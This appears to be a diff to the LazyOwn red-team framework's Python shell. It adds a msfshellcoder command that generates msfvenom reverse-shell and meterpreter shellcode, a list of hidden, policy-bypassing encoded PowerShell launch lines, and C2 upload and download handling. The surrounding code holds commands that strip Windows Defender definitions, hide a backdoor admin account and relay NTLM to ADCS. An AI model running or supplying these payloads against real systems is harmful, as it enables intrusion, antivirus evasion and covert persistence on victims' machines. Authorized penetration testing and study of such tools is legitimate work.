@@ -20,7 +20,7 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 """
 
 import cmd2
-
+from cmd2 import CommandSet, with_argparser, with_category
 from utils import *
 
 with open('payload.json', 'r') as file:
@@ -104,7 +104,7 @@ class LazyOwnShell(cmd2.Cmd):
     lhost = config.lhost
     lport = config.lport
     c2_port = config.c2_port
-
+    device = config.device
 
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
@@ -155,10 +155,12 @@ class LazyOwnShell(cmd2.Cmd):
         "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
         "ls": "list",
         "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
+        "man":"sh bash -c 'cat README.md| gum format'",
         "mitre_update":"sh cd external/.exploit/mitre && git pull",
         "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
         "nf": f"sh ./modules/nf -d {rhost} -o sessions/{rhost}_nuclerfuzzer",
         "nmap_ldap_rootdse": f"sh sudo nmap -Pn --script ldap-rootdse.nse {rhost}",
+        "nmcli": f"sh nmcli dev show {device}",
         "nxcridbrute": f"sh nxc smb {rhost} -u 'anonymous' -p '' --rid-brute 3000",
         "ntlmrelayx": f"sh ntlmrelayx.py --raw-port 6667 -t http://{domain}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
         "kallsyms": "sh sudo cat /proc/kallsyms",
@@ -718,6 +720,8 @@ class LazyOwnShell(cmd2.Cmd):
                             cmdinstall = replace_command_placeholders(tool['install_command'], self.params)
                             cmd = f"cd {install_path} && {cmdinstall}"
                             self.cmd(cmd)
+                            self.cmd("sleep 2")
+
 
                     if 'execute_command' in tool:
                         command = execute_command.format(**param_values)
@@ -729,16 +733,22 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(final_command)
 
                     if 'upload_file' in tool:
-                        remotecmd = replace_command_placeholders(tool['upload_file'], self.params)
+                        remotecmd = tool['upload_file']
                         cmd_remotecmd = f"upload_c2 {remotecmd}"
-                        self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
+                        self.display_toastr(f"Remote Upload executing: {cmd_remotecmd}", type='info')
                         self.onecmd(cmd_remotecmd)
-
+                        self.cmd("sleep 10")
                     if 'remote_command' in tool:
                         remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
                         cmd_remotecmd = f"issue_command_to_c2 {remotecmd}"
                         self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
                         self.onecmd(cmd_remotecmd)
+                    if 'download_file' in tool:
+                        downloadcmd = tool['download_file']
+                        cmd_downloadcmd = f"download_c2 {downloadcmd}"
+                        self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
+                        self.onecmd(cmd_downloadcmd)
+
                 except KeyError as e:
                     self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
                     return
@@ -6390,6 +6400,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN AV Cripple", '"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All'),
             ("WIN multiple RDP", 'reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f'),
             ("WIN Reg Query Uninstall", "cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
+            ("WIN Reg Query WinLogon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""),
             ("WIN Reg hidde grisun0 local admin", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v grisun0 /d 0 /f"),
             ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
@@ -8870,9 +8881,34 @@ class LazyOwnShell(cmd2.Cmd):
         base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
         final_command = f"powershell /enc {base64_payload}"
         final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
+        payloads = f"""
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty H -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /W Hi -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W H -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W Hi -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidd -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidden -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSt Hidde -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS H -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidde -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Wind Hidde -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Win Hid -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowSt Hidd -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowStyle Hidde -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
+        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_payload}
+        cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}
+        """
+
         print_msg(final_command)
         print_msg(final_final_command)
         copy2clip(final_command)
+        print_msg("Another options to payloads: ")
+        print_msg(f"\n\n {payloads} \n\n")
         return
 
     @cmd2.with_category(exploitation_category)
@@ -8996,6 +9032,7 @@ class LazyOwnShell(cmd2.Cmd):
             cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_command}
             cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_command}
             cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_command}
+            cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_command}
             """
             print_msg("Another options to payloads: ")
             print_msg(f"\n\n {payloads} \n\n")
@@ -26818,13 +26855,172 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"Command copied: {cmd}")
             print_warn("Execution cancelled.")
 
-    def do_pop(self, line):
-        if not line:
-            input("    [!] Enter command: ")
 
-        cmd = f"tmux display-popup -E '{line} ; read -p \"    [!] Press enter to continue...\"'"
+
+    @with_argparser(create_msfshellcoder_parser())
+    @with_category(post_exploitation_category)
+    def do_msfshellcoder(self, line):
+        """
+        Generate shellcode in C format using msfvenom for either a custom command or a reverse shell payload.
+        This command supports both direct argument input and interactive mode. It uses self.params for default
+        values (lhost, lport, etc). Output is saved to sessions/ as a .txt file in C array format.
+        Args:
+            --payload (-p): MSF payload (e.g., windows/x64/meterpreter/reverse_tcp).
+            --command (-c): Custom command to encode into shellcode (e.g., 'whoami').
+            --lhost (-H): Local IP for reverse shells.
+            --lport (-P): Local port for reverse shells.
+            --os (-o): Target OS: 'windows' or 'linux'.
+            --arch: Target architecture: 'x86' or 'x64' (default: x64).
+        Outputs:
+            Saves shellcode to ./sessions/shellcode_*.txt in C format.
+            Uses self.cmd() to run system commands and self.display_toastr() for UI feedback.
+        Examples:
+            msfshellcoder -c "calc.exe" --os windows
+            msfshellcoder -p linux/x64/shell_reverse_tcp -H 10.0.0.5 -P 4444
+            msfshellcoder  # Launch interactive mode
+        """
+        # Check if msfvenom is available
+        if not is_binary_present("msfvenom"):
+            self.display_toastr("msfvenom not found. Installing Metasploit Framework...", type="warning")
+            self.cmd("sudo apt-get update -y")
+            self.cmd("sudo apt-get install -y metasploit-framework")
+            if not is_binary_present("msfvenom"):
+                self.display_toastr("msfvenom installation failed. Aborting.", type="error")
+                return
+
+
+        args = line
+
+        if not line:
+            self.display_toastr("No arguments provided. Switching to interactive mode.", type="info")
+            choice = input("Generate (1) reverse shell or (2) custom command? [1/2]: ").strip()
+            if choice == "2":
+                cmd_input = input("Enter command to shellcode: ").strip()
+                target_os = input("Target OS (windows/linux): ").strip().lower()
+                arch = input("Architecture (x86/x64) [x64]: ").strip() or "x64"
+                lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
+                lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
+                try:
+                    lport = int(lport)
+                except ValueError:
+                    lport = self.params['lport']
+                args.command = cmd_input
+                args.os = target_os
+                args.arch = arch
+                args.lhost = lhost
+                args.lport = lport
+                args.payload = None
+            else:
+                args.payload = input(f"Payload (default: windows/x64/meterpreter/reverse_tcp): ").strip()
+                args.lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
+                args.lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
+                try:
+                    args.lport = int(args.lport)
+                except ValueError:
+                    args.lport = self.params['lport']
+                if not args.payload:
+                    args.payload = "windows/x64/meterpreter/reverse_tcp"
+        else:
+            # Use defaults from params if not provided
+            args.lhost = args.lhost or self.params['lhost']
+            args.lport = args.lport or self.params['lport']
+            if not args.lport:
+                self.display_toastr("LPORT is required.", type="error")
+                return
+
+        # Create sessions directory
+        self.cmd("mkdir -p sessions")
+
+        # Build payload based on input
+        if args.command:
+            if not args.os:
+                self.display_toastr("OS is required when using --command.", type="error")
+                return
+
+            os_key = "win" if args.os.startswith("win") else "lin"
+            arch_flag = "x86" if args.arch == "x86" else "x64"
+
+            if os_key == "win":
+                if args.arch == "x86":
+                    payload = "windows/exec"
+                    cmd_opt = f"CMD={args.command}"
+                else:
+                    payload = "windows/x64/exec"
+                    cmd_opt = f"CMD={args.command}"
+            else:  # linux
+                payload = "cmd/unix/reverse_bash" if "reverse" in args.command else "cmd/unix/generic"
+                if "reverse" in args.command:
+                    # Assume it's a reverse shell command
+                    cmd_opt = ""
+                else:
+                    cmd_opt = f"CMD={args.command}"
+
+            # Build msfvenom command
+            if os_key == "win" and "exec" in payload:
+                msf_cmd = f'msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
+            else:
+                # For bash or generic commands
+                msf_cmd = f'msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
+
+            output_file = f"sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
+            desc = f"Custom command: {args.command[:50]}..."
+
+        elif args.payload:
+            payload = args.payload
+            msf_cmd = f'msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport} -f c -o sessions/shellcode_{payload.replace("/", "_")}_{args.lhost}_{args.lport}.txt'
+            output_file = f"sessions/shellcode_{payload.replace('/', '_')}_{args.lhost}_{args.lport}.txt"
+            desc = f"Reverse shell: {payload}"
+        else:
+            self.display_toastr("Either --payload or --command is required.", type="error")
+            return
+
+        # Execute msfvenom
+        self.display_toastr(f"Generating shellcode: {desc}", type="info")
+        self.cmd(msf_cmd)
+
+        # Verify and notify
+        if os.path.exists(output_file):
+            self.display_toastr(f"Shellcode successfully generated: {output_file}", type="info")
+        else:
+            self.display_toastr(f"Failed to generate shellcode. Check msfvenom output.", type="error")
+
+
+    def do_pop(self, line):
+        """
+        Open a centered popup in the current tmux session to execute a shell command.
+
+        If no command is provided via argument, prompts the user interactively.
+        The popup remains open after command execution and waits for user acknowledgment
+        via pressing ENTER, avoiding premature closure without requiring fixed sleep delays.
+
+        Requirements:
+        - Must be run inside an active tmux session (TMUX environment variable set).
+        - Tmux server must be running.
+
+        The command is executed in a bash shell within the popup. If tmux is not available
+        or the environment is invalid, an error message is displayed and execution aborts.
+
+        Args:
+            line (str): The command to execute in the popup. If empty, prompts user input.
+        """
+        if not line:
+            line = input("    [!] Enter command: ") or 'whoami'
+
+        if 'TMUX' not in os.environ:
+            self.display_toastr("[!] Error: Not inside a tmux session.", type="error")
+            self.display_toastr("    [💡] Hint: Run this inside a tmux session (e.g. `v` or `h`).", type="info")
+            return
+
+        try:
+            subprocess.run(['tmux', 'list-sessions'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            self.display_toastr("    [!] Error: Tmux server not running or tmux not installed.", type="error")
+            return
+
+        cmd = f"""tmux popup -w 80% -h 60% -x C -y C -E 'bash -c \"{line} ; sleep 3\"'"""
         self.cmd(cmd)
         return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.load_yaml_plugins()
